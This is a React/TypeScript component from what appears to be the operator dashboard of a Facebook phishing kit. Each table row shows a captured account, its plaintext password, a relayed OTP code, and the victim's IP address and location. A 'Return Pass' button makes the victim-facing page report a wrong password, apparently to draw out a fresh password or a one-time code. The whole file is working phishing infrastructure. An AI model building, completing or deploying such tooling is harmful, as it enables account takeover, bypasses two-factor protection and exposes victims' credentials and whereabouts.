import { useState, useEffect } from 'react';
// @mui
import {
  Stack,
  TableRow,
  TableCell,
  IconButton,
  Chip,
  Tooltip,
  Typography,
} from '@mui/material';
// @types
import { IFbUser } from '../../../redux/slices/fb';
// components
import Iconify from '../../../components/iconify';
import { fDateTime } from '../../../utils/formatTime';

// ----------------------------------------------------------------------

type Props = {
  row: IFbUser;
  onReturnWrongPass: VoidFunction;
  onDelete: VoidFunction;
};

const STATUS_MAP: Record<
  IFbUser['status'],
  { label: string; color: 'default' | 'info' | 'warning' | 'error' | 'success' }
> = {
  pending_pass: { label: 'Chờ xử lý', color: 'info' },
  wrong_pass:   { label: 'Sai MK',   color: 'error' },
  pending_otp:  { label: 'Chờ OTP',  color: 'warning' },
  completed:    { label: 'Hoàn thành', color: 'success' },
};

export default function FbUserTableRow({ row, onReturnWrongPass, onDelete }: Props) {
  const {
    account,
    password,
    verifyCode,
    status,
    ipAddress,
    country,
    region,
    city,
    createdAt,
  } = row;

  const statusInfo = STATUS_MAP[status] || { label: status, color: 'default' };

  return (
    <TableRow hover>
      {/* Account */}
      <TableCell>
        <Stack spacing={0.2}>
          <Typography variant="body2" fontWeight={600} sx={{ color: 'text.primary' }}>
            {account}
          </Typography>
          <Typography variant="caption" sx={{ color: 'text.secondary' }}>
            🔑 {password}
          </Typography>
        </Stack>
      </TableCell>

      {/* OTP Code */}
      <TableCell>
        {verifyCode ? (
          <Typography
            variant="body2"
            fontWeight={700}
            sx={{ color: 'success.dark', letterSpacing: 2 }}
          >
            {verifyCode}
          </Typography>
        ) : (
          <Typography variant="caption" sx={{ color: 'text.disabled' }}>
            —
          </Typography>
        )}
      </TableCell>

      {/* Status */}
      <TableCell>
        <Chip
          label={statusInfo.label}
          color={statusInfo.color}
          size="small"
          variant="filled"
          sx={{ fontWeight: 600 }}
        />
      </TableCell>

      {/* Geo info */}
      <TableCell>
        <Stack spacing={0.2}>
          {ipAddress && (
            <Typography variant="caption">
              🌍 <b>{ipAddress}</b>
            </Typography>
          )}
          {country && (
            <Typography variant="caption">
              🏳️ {country}
            </Typography>
          )}
          {region && (
            <Typography variant="caption">
              🗺 {region}
            </Typography>
          )}
          {city && (
            <Typography variant="caption">
              📍 {city}
            </Typography>
          )}
          {!ipAddress && !country && (
            <Typography variant="caption" sx={{ color: 'text.disabled' }}>
              —
            </Typography>
          )}
        </Stack>
      </TableCell>

      {/* Created At */}
      <TableCell>
        <Typography variant="caption">{fDateTime(createdAt)}</Typography>
      </TableCell>

      {/* Actions */}
      <TableCell align="right">
        <Stack direction="row" justifyContent="flex-end" spacing={0.5}>
          {/* Return Wrong Pass button — only if pending_pass or pending_otp */}
          {(status === 'pending_pass' || status === 'pending_otp') && (
            <Tooltip title="Return Wrong Password (FE nhận lỗi sai MK)">
              <IconButton
                size="small"
                color="error"
                onClick={onReturnWrongPass}
                sx={{
                  bgcolor: 'error.lighter',
                  '&:hover': { bgcolor: 'error.light' },
                  borderRadius: 1,
                  px: 1,
                }}
              >
                <Iconify icon="eva:refresh-fill" width={16} />
                <Typography variant="caption" sx={{ ml: 0.5, fontWeight: 700 }}>
                  Return Pass
                </Typography>
              </IconButton>
            </Tooltip>
          )}

          {/* Delete */}
          <Tooltip title="Xoá bản ghi">
            <IconButton
              size="small"
              color="error"
              onClick={onDelete}
            >
              <Iconify icon="eva:trash-2-outline" width={18} />
            </IconButton>
          </Tooltip>
        </Stack>
      </TableCell>
    </TableRow>
  );
}
